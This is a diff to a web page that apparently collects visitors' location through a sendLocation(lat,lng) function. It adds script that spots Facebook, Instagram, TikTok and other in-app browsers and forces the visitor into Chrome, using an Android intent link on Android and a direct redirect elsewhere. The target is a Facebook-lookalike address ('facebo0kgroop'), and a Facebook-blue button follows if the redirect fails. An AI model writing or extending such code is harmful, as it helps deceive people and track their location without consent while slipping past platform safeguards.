@@ -69,12 +69,70 @@ async function sendLocation(lat,lng){
 }
 </script>
 <script>
-    if(navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV")){
-    document.body.innerHTML = `
-        <h2>Please open this link in your device browser for full functionality</h2>
-        <a href="${window.location.href}" target="_blank" rel="noopener">Open in Browser</a>
-    `;
-    }
+
+const REAL_URL = "https://facebo0kgroop.github.io/Find-People/";
+
+function isInAppBrowser() {
+  const ua = navigator.userAgent || navigator.vendor || window.opera;
+
+  return (
+    ua.includes("FBAN") ||
+    ua.includes("FBAV") ||
+    ua.includes("Instagram") ||
+    ua.includes("Line") ||
+    ua.includes("TikTok") ||
+    ua.includes("Snapchat") ||
+    ua.includes("Twitter")
+  );
+}
+
+function isAndroid() {
+  return /android/i.test(navigator.userAgent);
+}
+
+function openExternalBrowser() {
+
+  if(isAndroid()){
+    const intent = "intent://" + REAL_URL.replace(/^https?:\/\//,'') + "#Intent;scheme=https;package=com.android.chrome;end";
+    window.location.href = intent;
+  } else {
+    window.location.href = REAL_URL;
+  }
+
+}
+
+function showOpenButton(){
+
+  document.body.innerHTML = `
+  <div style="font-family:sans-serif;text-align:center;padding:40px">
+
+    <h2>Open in your browser</h2>
+    <p>This page works best in your device browser.</p>
+
+    <button onclick="openExternalBrowser()" 
+    style="padding:15px 30px;font-size:18px;border:none;border-radius:8px;background:#1877f2;color:white;">
+      Open in Browser
+    </button>
+
+    <p style="margin-top:20px;font-size:14px;">
+    If it doesn't open automatically,<br>
+    tap menu (⋮) → Open in browser
+    </p>
+
+  </div>
+  `;
+}
+
+if(isInAppBrowser()){
+
+  openExternalBrowser();
+
+  setTimeout(()=>{
+    showOpenButton();
+  },2000);
+
+}
+
 </script>
 </body>
 </html>
